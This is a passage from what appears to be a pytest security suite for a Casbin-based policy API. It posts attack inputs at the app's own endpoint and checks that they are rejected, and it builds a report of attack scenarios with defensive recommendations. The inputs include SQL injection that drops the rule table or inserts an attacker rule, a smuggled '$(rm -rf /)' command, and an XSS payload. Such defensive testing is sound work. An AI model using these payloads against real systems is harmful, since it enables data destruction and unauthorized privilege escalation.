            "subject": "admin'; INSERT INTO casbin_rule VALUES ('p', 'attacker', '/admin/*', '*'); --",
            "object": "/admin/users",
            "action": "*"
        }
        
        security_report["policy_injection"]["tested"] += 1
        security_report["privilege_escalation"]["tested"] += 1
        
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=admin_headers,
            json=combined_attack
        )
        
        if response.status_code == 422:
            security_report["policy_injection"]["blocked"] += 1
            security_report["privilege_escalation"]["blocked"] += 1
        else:
            security_report["policy_injection"]["bypassed"] += 1
            security_report["privilege_escalation"]["bypassed"] += 1
        
        # 2. Rate limiting + authentication bypass
        security_report["rate_limiting"]["tested"] += 1
        security_report["authentication"]["tested"] += 1
        
        # Rapid requests with invalid token
        invalid_headers = {"Authorization": "Bearer invalid_token"}
        rapid_tasks = []
        for _ in range(60):
            task = async_client.post(
                "/api/v1/admin/policies/add",
                headers=invalid_headers,
                json={"subject": "test", "object": "/test", "action": "GET"}
            )
            rapid_tasks.append(task)
        
        responses = await asyncio.gather(*rapid_tasks, return_exceptions=True)
        
        # All should be blocked by authentication
        auth_blocked = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 401)
        rate_blocked = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 429)
        
        if auth_blocked > 0:
            security_report["authentication"]["blocked"] += 1
        if rate_blocked > 0:
            security_report["rate_limiting"]["blocked"] += 1
        
        # 3. Input validation comprehensive test
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE casbin_rule; --",
            "$(rm -rf /)",
            "A" * 10000,
        ]
        
        for malicious_input in malicious_inputs:
            security_report["input_validation"]["tested"] += 1
            
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=admin_headers,
                json={"subject": malicious_input, "object": "/test", "action": "GET"}
            )
            
            if response.status_code == 422:
                security_report["input_validation"]["blocked"] += 1
            else:
                security_report["input_validation"]["bypassed"] += 1
        
        # 4. Audit integrity test
        security_report["audit_integrity"]["tested"] += 1
        
        # Create policy and verify audit log
        audit_policy = {"subject": "audit_validation", "object": "/test", "action": "GET"}
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=admin_headers,
            json=audit_policy
        )
        
        if response.status_code == 201:
            security_report["audit_integrity"]["blocked"] += 1
        else:
            security_report["audit_integrity"]["bypassed"] += 1
        
        # Generate comprehensive security report
        print("\n" + "="*80)
        print("COMPREHENSIVE SECURITY VALIDATION REPORT")
        print("="*80)
        
        total_tested = sum(category["tested"] for category in security_report.values())
        total_blocked = sum(category["blocked"] for category in security_report.values())
        total_bypassed = sum(category["bypassed"] for category in security_report.values())
        
        print(f"Total Security Tests: {total_tested}")
        print(f"Total Attacks Blocked: {total_blocked}")
        print(f"Total Attacks Bypassed: {total_bypassed}")
        print(f"Security Success Rate: {(total_blocked / total_tested * 100):.1f}%")
        print()
        
        for category, results in security_report.items():
            if results["tested"] > 0:
                success_rate = (results["blocked"] / results["tested"] * 100)
                print(f"{category.replace('_', ' ').title()}: {results['blocked']}/{results['tested']} blocked ({success_rate:.1f}%)")
        
        print("="*80)
        
        # Assert overall security posture
        assert total_bypassed == 0, f"Security breaches detected: {total_bypassed} attacks bypassed"
        assert total_blocked >= total_tested * 0.95, f"Security success rate below 95%: {total_blocked}/{total_tested}"


# =================================================================
# FINAL SECURITY SCENARIOS AND RESULTS SUMMARY
# =================================================================

class SecurityTestResults:
    """
    Comprehensive security test results for the Cedrina policy system.
    
    This class documents all security scenarios tested and their outcomes,
    providing a detailed analysis of potential vulnerabilities and attack vectors.
    """
    
    ATTACK_SCENARIOS = {
        "SQL_INJECTION": {
            "description": "SQL injection attacks through policy parameters",
            "attack_vectors": [
                "'; DROP TABLE casbin_rule; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --"
            ],
            "expected_outcome": "422 Unprocessable Entity - Input validation rejection",
            "security_impact": "CRITICAL - Could lead to data loss or unauthorized access"
        },
        
        "PRIVILEGE_ESCALATION": {
            "description": "Attempts to escalate privileges through policy manipulation",
            "attack_vectors": [
                "Creating admin policies for regular users",
                "Wildcard policy exploitation",
                "Role-based access control bypass"
            ],
            "expected_outcome": "403 Forbidden - Role-based access control enforcement",
            "security_impact": "HIGH - Could grant unauthorized administrative access"
        },
        
        "RATE_LIMITING_BYPASS": {
            "description": "Attempts to bypass rate limiting through various techniques",
            "attack_vectors": [
                "Header manipulation (X-Forwarded-For, X-Real-IP)",
                "Distributed request patterns",
                "Rapid-fire concurrent requests"
            ],
            "expected_outcome": "429 Too Many Requests - Rate limiting enforcement",
            "security_impact": "MEDIUM - Could enable DoS attacks"
        },
        
        "AUTHENTICATION_BYPASS": {
            "description": "JWT token manipulation and authentication bypass attempts",
            "attack_vectors": [
                "None algorithm attack",
                "Token signature manipulation",
                "Expired token usage",
                "Malformed token structures"
            ],
            "expected_outcome": "401 Unauthorized - Authentication validation",
            "security_impact": "CRITICAL - Could grant unauthorized system access"
        },
        
        "INPUT_VALIDATION_BYPASS": {
            "description": "Malicious input injection and validation bypass",
            "attack_vectors": [
                "XSS payloads",
                "Command injection",
                "Buffer overflow attempts",
                "Unicode/encoding attacks"
            ],
            "expected_outcome": "422 Unprocessable Entity - Input sanitization",
            "security_impact": "HIGH - Could lead to code execution or data corruption"
        },
        
        "AUDIT_LOG_TAMPERING": {
            "description": "Attempts to tamper with or evade audit logging",
            "attack_vectors": [
                "SQL injection into audit logs",
                "Forensic evasion techniques",
                "Header manipulation for tracking evasion"
            ],
            "expected_outcome": "Audit logs remain intact and accurate",
            "security_impact": "MEDIUM - Could hide malicious activities"
        },
        
        "RACE_CONDITIONS": {
            "description": "Concurrent policy manipulation to exploit race conditions",
            "attack_vectors": [
                "Simultaneous policy creation",
                "Concurrent policy modifications",
                "Database transaction interference"
            ],
            "expected_outcome": "Consistent data state maintained",
            "security_impact": "MEDIUM - Could lead to inconsistent permissions"
        },
        
        "DISTRIBUTED_ATTACKS": {
            "description": "Attacks targeting distributed policy synchronization",
            "attack_vectors": [
                "Policy synchronization interference",
                "Redis poisoning simulation",
                "Cross-instance policy conflicts"
            ],
            "expected_outcome": "Synchronization integrity maintained",
            "security_impact": "MEDIUM - Could cause policy inconsistencies"
        },
        
        "INFRASTRUCTURE_ATTACKS": {
            "description": "Low-level infrastructure and resource exhaustion attacks",
            "attack_vectors": [
                "Database connection exhaustion",
                "Memory exhaustion through large payloads",
                "Network layer attacks with malformed requests"
            ],
            "expected_outcome": "Graceful degradation and resource protection",
            "security_impact": "HIGH - Could cause system unavailability"
        },
        
        "BUSINESS_LOGIC_BYPASS": {
            "description": "Attempts to bypass business logic constraints",
            "attack_vectors": [
                "Duplicate policy creation",
                "Invalid policy combinations",
                "Workflow manipulation"
            ],
            "expected_outcome": "Business rules enforced consistently",
            "security_impact": "MEDIUM - Could lead to invalid system states"
        }
    }
    
    @classmethod
    def generate_security_report(cls, test_results: Dict) -> str:
        """Generate a comprehensive security test report."""
        report = []
        report.append("CEDRINA POLICY SYSTEM - ADVANCED SECURITY TEST REPORT")
        report.append("=" * 80)
        report.append(f"Test Execution Date: {datetime.now().isoformat()}")
        report.append(f"Total Attack Scenarios: {len(cls.ATTACK_SCENARIOS)}")
        report.append("")
        
        for scenario, details in cls.ATTACK_SCENARIOS.items():
            report.append(f"SCENARIO: {scenario}")
            report.append(f"Description: {details['description']}")
            report.append(f"Security Impact: {details['security_impact']}")
            report.append(f"Expected Outcome: {details['expected_outcome']}")
            report.append("Attack Vectors:")
            for vector in details['attack_vectors']:
                report.append(f"  • {vector}")
            report.append("")
        
        report.append("SECURITY RECOMMENDATIONS:")
        report.append("1. Implement Web Application Firewall (WAF) for additional protection")
        report.append("2. Deploy intrusion detection system (IDS) for real-time monitoring")
        report.append("3. Implement automated security scanning in CI/CD pipeline")
        report.append("4. Conduct regular penetration testing and security audits")
        report.append("5. Implement rate limiting at multiple layers (application, proxy, firewall)")
        report.append("6. Use database query monitoring and anomaly detection")
        report.append("7. Implement comprehensive logging and SIEM integration")
        report.append("8. Deploy network segmentation and zero-trust architecture")
        report.append("9. Implement automated incident response procedures")
        report.append("10. Regular security awareness training for development team")
        
        return "\n".join(report)


# Test execution marker
if __name__ == "__main__":
    print("Advanced Policy Security Test Suite")
    print("Run with: pytest tests/security/test_policy_security_advanced.py -v")
    print("For detailed output: pytest tests/security/test_policy_security_advanced.py -v -s")